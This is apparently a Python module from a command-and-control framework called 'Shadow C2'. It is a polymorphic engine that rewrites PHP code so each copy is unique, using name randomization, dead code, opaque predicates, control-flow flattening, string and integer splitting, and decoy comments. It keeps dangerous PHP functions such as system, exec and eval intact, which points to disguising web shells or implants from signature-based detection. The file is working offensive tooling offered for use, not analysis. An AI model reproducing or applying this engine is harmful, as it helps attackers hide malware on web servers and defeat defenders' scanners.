#!/usr/bin/env python3
"""
Shadow C2 — Polymorphic Engine
Every generation produces unique code through:
- Realistic variable/function name randomization
- Dead code injection with opaque predicates
- Control flow flattening
- String splitting and integer splitting
- Comment injection and function reordering
"""

import random
import re
import string
import hashlib
from typing import Dict, List, Set


class PolymorphicEngine:
    """
    Polymorphic code transformation engine.
    Each invocation produces a unique variant of the input PHP code.
    """

    # Realistic wordlists for name generation
    NOUNS = [
        "handler", "manager", "processor", "controller", "validator",
        "formatter", "converter", "parser", "builder", "factory",
        "service", "provider", "adapter", "wrapper", "helper",
        "config", "context", "session", "request", "response",
        "buffer", "cache", "queue", "stack", "store",
        "reader", "writer", "loader", "mapper", "filter",
        "encoder", "decoder", "serializer", "transformer", "analyzer",
        "monitor", "tracker", "logger", "dispatcher", "router",
        "resolver", "compiler", "executor", "scheduler", "worker",
        "client", "server", "proxy", "gateway", "bridge",
        "token", "header", "payload", "stream", "channel",
        "plugin", "module", "component", "element", "widget",
        "iterator", "generator", "collector", "aggregator", "selector",
        "template", "schema", "model", "entity", "record",
        "index", "offset", "length", "counter", "timer",
        "input", "output", "result", "status", "error",
        "path", "route", "endpoint", "resource", "asset",
        "data", "info", "meta", "attr", "prop",
        "node", "tree", "graph", "list", "map",
    ]

    VERBS = [
        "process", "handle", "validate", "format", "convert",
        "parse", "build", "create", "init", "setup",
        "load", "save", "read", "write", "fetch",
        "send", "receive", "dispatch", "route", "resolve",
        "compile", "execute", "run", "start", "stop",
        "encode", "decode", "serialize", "transform", "analyze",
        "check", "verify", "test", "assert", "ensure",
        "get", "set", "update", "delete", "remove",
        "add", "insert", "append", "prepend", "merge",
        "filter", "sort", "search", "find", "match",
        "open", "close", "connect", "disconnect", "bind",
        "register", "unregister", "subscribe", "publish", "emit",
        "wrap", "unwrap", "pack", "unpack", "extract",
        "render", "display", "show", "hide", "toggle",
        "cache", "flush", "clear", "reset", "refresh",
    ]

    ADJECTIVES = [
        "local", "remote", "global", "static", "dynamic",
        "primary", "secondary", "default", "custom", "internal",
        "external", "active", "passive", "cached", "temporary",
        "current", "previous", "next", "final", "initial",
        "raw", "processed", "encoded", "decoded", "compressed",
        "valid", "invalid", "pending", "completed", "failed",
        "secure", "public", "private", "shared", "unique",
        "base", "core", "main", "root", "child",
    ]

    def __init__(self):
        self._name_cache: Dict[str, str] = {}
        self._used_names: Set[str] = set()

    def _reset(self):
        self._name_cache.clear()
        self._used_names.clear()

    # -- name generation -----------------------------------------------------

    def generate_var_name(self) -> str:
        """Generate a realistic PHP variable name."""
        patterns = [
            lambda: f"{random.choice(self.ADJECTIVES)}{random.choice(self.NOUNS).capitalize()}",
            lambda: f"{random.choice(self.VERBS)}{random.choice(self.NOUNS).capitalize()}",
            lambda: f"{random.choice(self.NOUNS)}{random.choice(self.NOUNS).capitalize()}",
            lambda: f"_{random.choice(self.NOUNS)}_{random.randint(1, 99)}",
            lambda: f"{random.choice(self.NOUNS)}_{random.choice(self.ADJECTIVES)}",
        ]
        for _ in range(100):
            name = random.choice(patterns)()
            if name not in self._used_names:
                self._used_names.add(name)
                return name
        return f"_v{random.randint(1000, 9999)}"

    def generate_func_name(self) -> str:
        """Generate a realistic PHP function name."""
        name = f"{random.choice(self.VERBS)}{random.choice(self.NOUNS).capitalize()}"
        suffix = random.choice(["", "Ex", "Internal", "Helper", "Impl", ""])
        full = name + suffix
        if full not in self._used_names:
            self._used_names.add(full)
            return full
        return f"fn_{random.randint(1000, 9999)}"

    def generate_class_name(self) -> str:
        """Generate a CamelCase class name."""
        return (random.choice(self.ADJECTIVES).capitalize() +
                random.choice(self.NOUNS).capitalize() +
                random.choice(["", "Service", "Manager", "Handler", "Provider"]))

    # -- core transformations ------------------------------------------------

    def randomize_names(self, php_code: str) -> str:
        """Replace variable and function names with realistic random names."""
        self._reset()

        # Protected names that shouldn't be renamed
        protected = {
            "$_GET", "$_POST", "$_REQUEST", "$_SERVER", "$_SESSION",
            "$_COOKIE", "$_FILES", "$_ENV", "$GLOBALS", "$this",
            "$argc", "$argv", "$php_errormsg",
        }

        # Find all variable names
        var_pattern = re.compile(r'\$([a-zA-Z_]\w*)')
        variables = set(var_pattern.findall(php_code))

        var_map = {}
        for var in variables:
            full_var = f"${var}"
            if full_var in protected:
                continue
            if var not in var_map:
                var_map[var] = self.generate_var_name()

        # Replace variables (longest first to avoid partial replacements)
        for old, new in sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True):
            php_code = php_code.replace(f"${old}", f"${new}")

        # Find and replace user-defined function names
        func_pattern = re.compile(r'function\s+([a-zA-Z_]\w*)\s*\(')
        functions = func_pattern.findall(php_code)

        builtin_funcs = {
            "system", "exec", "shell_exec", "passthru", "popen", "proc_open",
            "file_get_contents", "file_put_contents", "fopen", "fread", "fwrite",
            "fclose", "base64_decode", "base64_encode", "str_rot13", "gzuncompress",
            "gzcompress", "openssl_decrypt", "openssl_encrypt", "hex2bin", "bin2hex",
            "chr", "ord", "strlen", "substr", "strrev", "str_replace", "preg_replace",
            "array_map", "call_user_func", "call_user_func_array", "create_function",
            "assert", "eval", "ini_set", "error_reporting", "set_error_handler",
            "mail", "putenv", "getenv", "phpinfo", "phpversion",
        }

        func_map = {}
        for func in functions:
            if func not in builtin_funcs and func not in func_map:
                func_map[func] = self.generate_func_name()

        for old, new in sorted(func_map.items(), key=lambda x: len(x[0]), reverse=True):
            php_code = re.sub(rf'\b{re.escape(old)}\b', new, php_code)

        return php_code

    def inject_dead_code(self, php_code: str, density: float = 0.3) -> str:
        """Insert realistic-looking dead code blocks."""
        dead_blocks = [
            self._dead_function(),
            self._dead_if_block(),
            self._dead_array_operation(),
            self._dead_string_operation(),
            self._dead_math_operation(),
            self._dead_comment_block(),
        ]

        lines = php_code.split("\n")
        result = []
        for i, line in enumerate(lines):
            result.append(line)
            if random.random() < density and line.strip() and not line.strip().startswith("<?"):
                block = random.choice(dead_blocks)
                result.append(block)

        return "\n".join(result)

    def flatten_control_flow(self, php_code: str) -> str:
        """Wrap code blocks in switch/case dispatcher."""
        state_var = self.generate_var_name()
        # Simple flattening: wrap the main logic in a while/switch
        lines = php_code.split("\n")
        # Find the main code block (between <?php and ?>)
        start_idx = -1
        end_idx = len(lines)
        for i, line in enumerate(lines):
            if "<?php" in line.lower() or "<?" in line:
                start_idx = i
            if "?>" in line:
                end_idx = i

        if start_idx < 0:
            return php_code

        # Extract core code
        header = "\n".join(lines[:start_idx + 1])
        core = "\n".join(lines[start_idx + 1:end_idx])
        footer = "\n".join(lines[end_idx:])

        # Split core into blocks at empty lines or function boundaries
        blocks = [b.strip() for b in core.split("\n\n") if b.strip()]
        if len(blocks) < 2:
            return php_code

        # Build dispatch table
        states = list(range(len(blocks)))
        random.shuffle(states)

        dispatch = f"${state_var} = {states[0]};\n"
        dispatch += f"while(${state_var} !== -1) {{\n"
        dispatch += f"  switch(${state_var}) {{\n"

        for i, (state, block) in enumerate(zip(states, blocks)):
            next_state = states[i + 1] if i + 1 < len(states) else -1
            dispatch += f"    case {state}:\n"
            for bline in block.split("\n"):
                dispatch += f"      {bline}\n"
            dispatch += f"      ${state_var} = {next_state};\n"
            dispatch += f"      break;\n"

        dispatch += "  }\n}\n"

        return f"{header}\n{dispatch}\n{footer}"

    def add_opaque_predicates(self, php_code: str) -> str:
        """Insert always-true conditions that look complex."""
        predicates = [
            "((time() * 0 + 1) === 1)",
            "((ord('A') - 65) === 0)",
            "(strlen('x') > 0)",
            "((PHP_INT_SIZE * 0 + 1) == 1)",
            "(is_string('test'))",
            "((42 ^ 42) === 0)",
            "((~0) !== 0)",
            "(PHP_MAJOR_VERSION >= 5)",
            "(defined('PHP_EOL'))",
            "((pow(2, 0)) == 1)",
        ]

        lines = php_code.split("\n")
        result = []
        for line in lines:
            stripped = line.strip()
            if (stripped.startswith("if") or stripped.startswith("$")) and random.random() < 0.15:
                pred = random.choice(predicates)
                indent = len(line) - len(line.lstrip())
                result.append(" " * indent + f"if({pred}) {{")
                result.append(line)
                result.append(" " * indent + "}")
            else:
                result.append(line)
        return "\n".join(result)

    def split_strings(self, php_code: str) -> str:
        """Break string literals into concatenated parts."""
        def split_str(match):
            s = match.group(1)
            if len(s) < 4:
                return match.group(0)
            # Split into 2-4 character chunks
            chunks = []
            i = 0
            while i < len(s):
                chunk_len = random.randint(2, min(4, len(s) - i))
                if len(s) - i <= 4:
                    chunk_len = len(s) - i
                chunks.append(s[i:i + chunk_len])
                i += chunk_len
            return ".".join(f"'{c}'" for c in chunks)

        # Match single-quoted strings (not inside function calls that need exact strings)
        return re.sub(r"'([a-zA-Z_]{4,})'", split_str, php_code)

    def split_integers(self, php_code: str) -> str:
        """Replace integer constants with arithmetic expressions."""
        def split_int(match):
            n = int(match.group(1))
            if n == 0 or n == 1:
                return match.group(0)
            a = random.randint(1, max(2, n - 1))
            b = n - a
            return f"({a}+{b})"

        # Match standalone integers (not in variable names or strings)
        return re.sub(r'(?<!["\'\w$])(\d{2,5})(?!["\'\w])', split_int, php_code)

    def inject_comments(self, php_code: str) -> str:
        """Add realistic PHPDoc comments and inline comments."""
        doc_comments = [
            "/** @var string Configuration parameter */",
            "/** Initialize internal state machine */",
            "/** @param array $options Processing options */",
            "/** Validate input parameters before processing */",
            "/** @return bool True on successful validation */",
            "/** Handle edge case for empty input */",
            "// TODO: Optimize this section for large datasets",
            "// Legacy compatibility layer - do not remove",
            "// Fallback path for older PHP versions",
            "/* Buffer overflow protection */",
            "// Rate limiting check",
            "/** @throws RuntimeException On invalid state */",
            "// Debug: remove in production",
            "/* Performance critical section */",
            "// Normalize unicode characters",
        ]

        lines = php_code.split("\n")
        result = []
        for line in lines:
            if random.random() < 0.1 and line.strip():
                indent = len(line) - len(line.lstrip())
                result.append(" " * indent + random.choice(doc_comments))
            result.append(line)
        return "\n".join(result)

    def reorder_functions(self, php_code: str) -> str:
        """Shuffle function order (PHP doesn't care about declaration order)."""
        # Find function blocks
        func_pattern = re.compile(
            r'(function\s+\w+\s*\([^)]*\)\s*\{)',
            re.MULTILINE
        )

        # Simple approach: find top-level functions and shuffle
        functions = []
        non_func_code = []
        in_func = False
        brace_depth = 0
        current_func = []

        for line in php_code.split("\n"):
            if not in_func:
                if re.match(r'\s*function\s+\w+', line):
                    in_func = True
                    brace_depth = 0
                    current_func = [line]
                    brace_depth += line.count("{") - line.count("}")
                    if brace_depth <= 0 and "{" in line:
                        functions.append("\n".join(current_func))
                        in_func = False
                else:
                    non_func_code.append(line)
            else:
                current_func.append(line)
                brace_depth += line.count("{") - line.count("}")
                if brace_depth <= 0:
                    functions.append("\n".join(current_func))
                    in_func = False

        if in_func:
            functions.append("\n".join(current_func))

        random.shuffle(functions)

        # Reconstruct: non-function code first, then shuffled functions
        result = "\n".join(non_func_code)
        if functions:
            result += "\n\n" + "\n\n".join(functions)
        return result

    # -- dead code generators ------------------------------------------------

    def _dead_function(self) -> str:
        name = self.generate_func_name()
        param = self.generate_var_name()
        body_var = self.generate_var_name()
        return f"""
function {name}(${param} = null) {{
    ${body_var} = is_array(${param}) ? count(${param}) : strlen((string)${param});
    if(${body_var} > PHP_INT_MAX) {{ return false; }}
    return ${body_var} * 0;
}}"""

    def _dead_if_block(self) -> str:
        var = self.generate_var_name()
        return f"""
${var} = time() * 0;
if(${var} > 999999) {{
    @error_reporting(0);
    ${var} = null;
}}"""

    def _dead_array_operation(self) -> str:
        var = self.generate_var_name()
        return f"""
${var} = array_merge(array(), array_fill(0, 0, ''));
if(count(${var}) > 100) {{ array_pop(${var}); }}"""

    def _dead_string_operation(self) -> str:
        var = self.generate_var_name()
        return f"""
${var} = str_repeat(' ', 0);
${var} = trim(${var});"""

    def _dead_math_operation(self) -> str:
        var = self.generate_var_name()
        a, b = random.randint(1, 100), random.randint(1, 100)
        return f"""
${var} = ({a} * {b}) - ({a} * {b});
if(${var} !== 0) {{ exit; }}"""

    def _dead_comment_block(self) -> str:
        comments = [
            "Database connection pooling optimization",
            "Memory allocation tracker for large datasets",
            "Thread-safe queue implementation",
            "Binary search tree rebalancing",
            "Hash table collision resolution",
        ]
        return f"/* {random.choice(comments)} */"

    # -- main entry point ----------------------------------------------------

    def apply_all(self, php_code: str, level: int = 5) -> str:
        """
        Apply all polymorphic transformations based on intensity level (1-10).
        Higher level = more transformations = more obfuscated.
        """
        self._reset()

        if level >= 1:
            php_code = self.randomize_names(php_code)
        if level >= 2:
            php_code = self.inject_comments(php_code)
        if level >= 3:
            php_code = self.split_strings(php_code)
        if level >= 4:
            php_code = self.add_opaque_predicates(php_code)
        if level >= 5:
            php_code = self.inject_dead_code(php_code, density=0.1 * level / 5)
        if level >= 6:
            php_code = self.split_integers(php_code)
        if level >= 7:
            php_code = self.reorder_functions(php_code)
        if level >= 9:
            php_code = self.flatten_control_flow(php_code)

        return php_code
